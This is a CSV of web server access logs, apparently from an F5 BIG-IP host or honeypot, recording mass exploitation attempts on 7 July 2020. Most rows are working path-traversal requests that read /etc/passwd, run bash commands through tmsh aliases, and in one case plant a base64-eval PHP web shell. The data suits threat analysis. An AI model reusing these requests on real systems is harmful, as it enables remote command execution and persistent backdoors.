Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 7, 2020 @ 03:54:09.000",45.76.27.136,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36",200
"Jul 7, 2020 @ 03:50:23.000",144.202.50.219,GET,//xui/common/scripts/utility.php,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),404
"Jul 7, 2020 @ 03:50:22.000",144.202.50.219,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),200
"Jul 7, 2020 @ 03:50:20.000",144.202.50.219,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe2020,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),200
"Jul 7, 2020 @ 03:50:19.000",144.202.50.219,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe2020&content=mount%20-o%20remount%20-rw%20/usr%20;echo%20'utility%3C?php%20@eval(base64_decode($_POST%5B%22session_sK4hodQm%22%5D));'%20%3E%20/usr/local/www/xui/common/scripts/utility.php;mount%20-o%20remount%20-r%20/usr,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),200
"Jul 7, 2020 @ 03:50:17.000",144.202.50.219,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),200
"Jul 7, 2020 @ 03:50:15.000",144.202.50.219,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;) http://help.yahoo.com/help/us/ysearch/slurp),200
"Jul 7, 2020 @ 03:49:16.000",185.173.35.21,GET,/,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,200
"Jul 7, 2020 @ 03:47:59.000",37.49.226.35,POST,/GponForm/diag_Form?style/,curl/7.3.2,404
"Jul 7, 2020 @ 03:45:47.000",139.180.145.92,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 03:42:45.000",139.180.145.92,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 03:42:38.000",139.180.145.92,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 03:42:34.000",139.180.145.92,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license,httpx - Open-source project (github.com/projectdiscovery/httpx),200
"Jul 7, 2020 @ 03:38:06.000",193.218.118.130,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release,curl/7.65.3,200
"Jul 7, 2020 @ 03:35:22.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:35:21.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:35:19.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:35:17.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:33:56.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:33:54.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:33:52.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:33:49.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:30:51.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:30:49.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:30:47.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:30:44.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:29:52.000",37.120.203.196,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+cli,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",200
"Jul 7, 2020 @ 03:29:50.000",37.120.203.196,GET,/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=CUSTOMMESSAGEXD,python-requests/2.22.0,200
"Jul 7, 2020 @ 03:29:13.000",223.188.127.41,GET,/tmui/tmui/login/welcome.jsp,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:29:11.000",223.188.127.41,GET,/tmui/login.jsp,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:29:08.000",223.188.127.41,GET,/tmui/tmui/system/settings/redirect.jsp,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,302
"Jul 7, 2020 @ 03:28:52.000",223.188.127.41,GET,/favicon.ico,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:50.000",223.188.127.41,GET,/tmui/login.jsp%20/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:40.000",223.188.127.41,GET,/tmui/tmui/login/welcome.jsp,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:39.000",223.188.127.41,GET,/xui/common/css/base.css,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:37.000",223.188.127.41,GET,/xui/common/css/modals.css,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:35.000",223.188.127.41,GET,/tmui/tmui/login/images/background_banner.png,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:35.000",223.188.127.41,GET,/xui/common/blank.html,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:35.000",223.188.127.41,GET,/xui/common/images/favicon.ico,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:33.000",223.188.127.41,GET,/xui/common/css/fonts.css,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:33.000",223.188.127.41,GET,/xui/common/css/reset.css,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:33.000",223.188.127.41,GET,/tmui/tmui/login/images/logo_f5.png,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:32.000",223.188.127.41,GET,/tmui/tmui/login/css/login.css?,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:32.000",223.188.127.41,GET,/xui/common/scripts/utility.js?,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:30.000",223.188.127.41,GET,/tmui/login.jsp,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:28:28.000",223.188.127.41,GET,/tmui/tmui/system/settings/redirect.jsp,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,302
"Jul 7, 2020 @ 03:28:25.000",223.188.127.41,GET,/,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0,200
"Jul 7, 2020 @ 03:27:18.000",103.140.186.77,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/bf09a4a6-c001-11ea-b076-acde48001122,python-requests/2.18.4,200
"Jul 7, 2020 @ 03:27:15.000",103.140.186.77,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/bf09a4a6-c001-11ea-b076-acde48001122&content=id,python-requests/2.18.4,200
"Jul 7, 2020 @ 03:27:13.000",103.140.186.77,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.18.4,200
"Jul 7, 2020 @ 03:23:09.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:23:06.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:23:04.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:23:02.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:22:51.000",101.32.19.6,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1062.9.1.el7.x86_64,200
"Jul 7, 2020 @ 03:19:27.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:19:25.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:19:23.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:19:21.000",92.38.130.163,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:14:26.000",207.246.74.43,GET,/,-,400
"Jul 7, 2020 @ 03:14:11.000",67.205.160.159,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 03:13:22.000",45.83.66.62,GET,/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,200
"Jul 7, 2020 @ 03:12:41.000",209.17.96.146,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 03:12:11.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:12:08.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:12:06.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:12:03.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:11:52.000",207.246.74.43,GET,/,-,400
"Jul 7, 2020 @ 03:11:24.000",192.35.168.144,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 03:07:33.000",139.180.209.108,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:07:31.000",139.180.209.108,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 03:06:58.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:06:57.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:06:56.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:06:55.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 03:05:32.000",144.202.58.117,GET,/,-,400
"Jul 7, 2020 @ 03:05:18.000",144.202.58.117,GET,/,-,400
"Jul 7, 2020 @ 03:00:46.000",45.83.66.74,GET,/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,200
"Jul 7, 2020 @ 03:00:36.000",209.17.96.186,GET,/,Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com),200
"Jul 7, 2020 @ 02:59:19.000",45.83.66.174,GET,/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,200
"Jul 7, 2020 @ 02:57:31.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:57:30.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:57:29.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:57:28.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:55:22.000",223.149.181.132,GET,/,-,400
"Jul 7, 2020 @ 02:54:11.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:54:09.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:54:07.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:54:04.000",176.122.177.250,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:53:18.000",139.180.209.108,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxxx,python-requests/2.21.0,200
"Jul 7, 2020 @ 02:53:16.000",139.180.209.108,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxxx&content=id,python-requests/2.21.0,200
"Jul 7, 2020 @ 02:53:14.000",192.35.168.201,GET,/,Mozilla/5.0 zgrab/0.x,200
"Jul 7, 2020 @ 02:53:13.000",139.180.209.108,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.21.0,200
"Jul 7, 2020 @ 02:53:13.000",192.35.168.201,GET,/,-,200
"Jul 7, 2020 @ 02:53:11.000",192.35.168.201,GET,/api,Mozilla/5.0 zgrab/0.x,401
"Jul 7, 2020 @ 02:53:11.000",139.180.209.108,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.21.0,200
"Jul 7, 2020 @ 02:51:59.000",23.106.122.20,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0,200
"Jul 7, 2020 @ 02:47:52.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:47:51.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:47:43.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:47:43.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:47:26.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:47:26.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:46:35.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:46:35.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:46:19.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:46:17.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:43:08.000",45.83.67.234,GET,/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,200
"Jul 7, 2020 @ 02:42:53.000",107.191.50.228,GET,/tmui/login.jsp,python-requests/2.22.0,200
"Jul 7, 2020 @ 02:42:51.000",107.191.50.228,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.22.0,200
"Jul 7, 2020 @ 02:36:57.000",184.105.139.67,GET,/,-,200
"Jul 7, 2020 @ 02:35:18.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 02:33:35.000",74.82.47.5,GET,/,-,200
"Jul 7, 2020 @ 02:33:20.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:33:20.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:33:18.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:33:17.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:32:29.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 02:32:20.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:32:19.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:32:18.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:32:17.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:30:28.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:30:27.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:30:26.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:30:25.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:30:02.000",183.136.225.44,GET,/,-,400
"Jul 7, 2020 @ 02:27:20.000",45.83.64.207,GET,/,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,200
"Jul 7, 2020 @ 02:26:47.000",115.171.63.204,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0,200
"Jul 7, 2020 @ 02:25:42.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:25:42.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:25:41.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:25:40.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:23:44.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:23:43.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:23:42.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:23:40.000",45.32.21.63,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.24.0,200
"Jul 7, 2020 @ 02:21:05.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:21:04.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:21:03.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:21:02.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:20:56.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:20:56.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:20:39.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:20:39.000",8.209.246.114,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.23.0,200
"Jul 7, 2020 @ 02:20:32.000",8.209.246.114,GET,/tmui/login.jsp,python-requests/2.23.0,200
